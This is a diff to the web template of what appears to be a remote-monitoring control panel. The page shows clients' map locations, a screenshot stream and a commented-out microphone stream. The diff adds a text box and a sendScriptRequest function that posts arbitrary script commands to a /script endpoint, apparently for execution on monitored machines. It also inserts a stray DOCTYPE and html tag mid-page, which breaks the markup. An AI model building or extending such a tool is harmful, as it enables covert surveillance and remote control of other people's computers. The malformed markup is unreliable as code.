@@ -28,6 +28,16 @@
         margin-right: 10px;
         margin-bottom: 10px;
       }
+      #commandInput {
+            width: 80%;
+            height: 150px;
+            margin: 20px 0;
+            padding: 12px;
+            font-size: 16px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            resize: vertical;
+        }
     </style>
   </head>
   <body>
@@ -51,6 +61,12 @@
       <button onclick="window.location.href='/map?client={{.}}'">
         Show on the Map
       </button>
+      <textarea 
+        id="commandInput" 
+        placeholder="Enter your script command here..."
+    ></textarea>
+    <br></br>
+    <button onclick="sendScriptRequest()">Send Command</button>
     </div>
     <p>Server time: <span id="serverTime"></span></p>
     <img
@@ -64,6 +80,14 @@
       src="../uploads/latest_screenshot.jpg"
       alt="Screenshot Stream"
     />
+
+    <!DOCTYPE html>
+<html>
+
+
+
+   
+
 
     <!-- <h2>Микрофонный стрим</h2>
     <audio id="micStream" controls autoplay>
@@ -234,6 +258,20 @@
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
+      }
+
+      function sendScriptRequest() {
+            const input = document.getElementById('commandInput');
+            const script = input.value;
+            
+            fetch('/script', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ script: script }),
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch(error => console.error('Error:', error));
       }
 
       setInterval(() => {
